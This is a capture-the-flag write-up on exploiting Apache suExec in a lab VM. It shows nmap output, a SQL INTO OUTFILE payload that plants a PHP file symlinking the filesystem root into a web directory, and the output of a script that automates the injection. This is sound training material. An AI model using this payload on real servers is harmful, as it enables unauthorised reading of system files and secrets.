# Writeup 2 - SuExec Vulnerability

## Writeups Map

![Imgur](https://i.imgur.com/gb4HAhr.png)

## Summary

- [8.3 Exploiting suExec](#83-exploiting-suexec)

## Exploitation

### 8.3 Exploiting suExec

> All the following steps can lead here:
>
> - [7. Logging into Phpmyadmin](./Writeup1.md#7-logging-into-phpmyadmin)

We now have access to the `root` user in `phpmyadmin` and we need to retrievethe hidden password.

When using `nmap` we can see that the server is running on `Apache 2.22.2`

```console
vagrant@kali% nmap -sV 192.168.100.6
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-29 12:39 UTC
Nmap scan report for 192.168.100.6
Host is up (0.0011s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
21/tcp  open  ftp      vsftpd 2.0.8 or later
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
143/tcp open  imap     Dovecot imapd
443/tcp open  ssl/http Apache httpd 2.2.22
993/tcp open  ssl/imap Dovecot imapd
```

After searching for exploit on this version, we found the [Apache suEXEC](https://www.exploit-db.com/exploits/27397) exploit.

It is quite simple, suExec is a feature that provide the ability to run CGI and SSI programs
under user IDs different from the user ID of the calling web server. When well configured it can be used to reduce the risks implied by the execution of private CGI or SSI programs.

The bug is even more simple, in this version, we can create a symbolic link from the backdoor we found earlier in `template_c/` using a `.php` file like so:

```php
SELECT 1, '<?php symlink(\"/\", \"stuff.php\");?>' INTO OUTFILE '/var/www/forum/templates_c/tosuexec.php'
```

#### Usage

The [script](./scripts/suExec.py) only consist in injecting the server directly from terminal to make it cleaner :

```console
vagrant@kali% python3 suexec.py
Enter the IP address of the phpMyAdmin server: [IP]
SUCCESS, go to https://[IP]/forum/templates_c/stuff.php
```

In the end it gives us the link which will be a symbolic link to the root, where we can find the `LOOKATME` folder in which we can findthe password for the next step :

![Imgur](https://i.imgur.com/fsRNUbX.png)

![Imgur](https://i.imgur.com/m4Gw7o3.png)

> From this step you can continue to all the following steps
>
> - [9.2 Getting a FTP access](./Writeup1.md#92-getting-a-ftp-access)